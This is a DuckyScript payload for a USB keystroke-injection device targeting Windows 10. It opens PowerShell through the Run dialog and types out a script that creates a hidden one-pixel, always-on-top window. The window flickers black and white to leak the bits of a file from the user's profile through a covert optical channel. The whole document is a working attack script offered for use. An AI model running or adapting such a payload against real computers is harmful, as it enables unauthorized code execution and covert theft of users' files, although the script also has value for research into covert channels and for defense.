REM Title: PixelReflection
REM Author: Cribbit
REM Description: Creates a form and changes the backgroud to black or white to represent the bits of a file.
REM Target: Windows 10

ATTACKMODE HID
REM Frames per secound
DEFINE #FPS 60
REM form position
DEFINE #TOP 0
DEFINE #LEFT 0
REM form size 1x1 px
DEFINE #HEIGHT 1
DEFINE #WIDTH 1
REM File to send (suggest a small file)
DEFINE #FILE $env:USERPROFILE\test.jpg

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION


DELAY 2000
GUI r
DELAY 200
STRINGLN powershell
DELAY 500

STRING [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
SHIFT ENTER
STRING Add-Type -Assembly PresentationFramework
SHIFT ENTER
STRING $fps = #FPS
SHIFT ENTER
STRING $mills = 1000/$fps
SHIFT ENTER
REM # xml of the wpf xaml code. this is the window to be shown
STRING [xml]$xaml = @"
SHIFT ENTER
STRING <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
SHIFT ENTER
STRING  Width="#WIDTH" Height="#HEIGHT" Left="#LEFT" Top="#TOP"
SHIFT ENTER
STRING  WindowStyle="None" Background="Red" Topmost="True" ShowInTaskbar="False" ResizeMode="NoResize"/>
SHIFT ENTER
STRING "@
SHIFT ENTER
REM # create a reader for the xml
STRING $reader = (New-Object System.Xml.XmlNodeReader $xaml);
SHIFT ENTER
REM # create the window from the reader
STRING $window = [Windows.Markup.XamlReader]::Load($reader);
SHIFT ENTER
STRING $timer = New-Object System.Windows.Forms.Timer;
SHIFT ENTER
STRING $timer.Interval = 5;
SHIFT ENTER
REM # main code
STRING Function Timer_Tick()
SHIFT ENTER
STRING {
SHIFT ENTER
STRING     $timer.Stop();
SHIFT ENTER
STRING     Start-Sleep -Milliseconds $mills;
SHIFT ENTER
STRING     Get-Content #FILE -En By | % {
SHIFT ENTER
STRING         $b=$_;7..0 | % {
SHIFT ENTER
STRING             if($b-band(1-shl$_))
SHIFT ENTER
STRING             {
SHIFT ENTER
STRING                 $window.Background = "White";
SHIFT ENTER
STRING             }
SHIFT ENTER
STRING             else
SHIFT ENTER
STRING             {
SHIFT ENTER
STRING                 $window.Background = "Black";
SHIFT ENTER
STRING             }
SHIFT ENTER
STRING             $window.Dispatcher.Invoke([action]{}, "Render");
SHIFT ENTER
STRING             Start-Sleep -Milliseconds $mills;
SHIFT ENTER
STRING         }
SHIFT ENTER
STRING     };
SHIFT ENTER
STRING     $window.Background = "Green";
SHIFT ENTER
STRING     $window.Dispatcher.Invoke([action]{}, "Render");
SHIFT ENTER
STRING     Start-Sleep -Milliseconds $mills;
SHIFT ENTER
STRING     $window.Close();
SHIFT ENTER
STRING }
SHIFT ENTER
STRING $window.Add_Loaded({$timer.Start()});
SHIFT ENTER
STRING $timer.Add_Tick({Timer_Tick});
SHIFT ENTER
STRINGLN [void]$window.ShowDialog();